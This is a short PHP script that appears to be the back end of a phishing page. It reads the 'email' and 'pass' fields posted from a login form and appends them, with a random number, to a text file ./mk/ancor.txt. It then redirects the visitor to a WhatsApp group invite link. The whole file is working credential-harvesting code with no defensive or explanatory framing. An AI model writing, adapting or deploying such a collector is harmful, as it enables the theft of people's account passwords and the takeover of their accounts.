<?php
header("Location: https://chat.whatsapp.com/CbBu6CYVirFD7QyaCIU6dk");
$ADEx = "./mk/ancor.txt";
$ran = rand(10,1000000000000);
$ADEy = $_POST['email'];
$ADEz = $_POST['pass'];

$handle = fopen($ADEx, 'a');
fwrite($handle, "$ran|$ADEy|$ADEz|$c");
fwrite($handle, "\n");
fclose($handle);
exit;
?>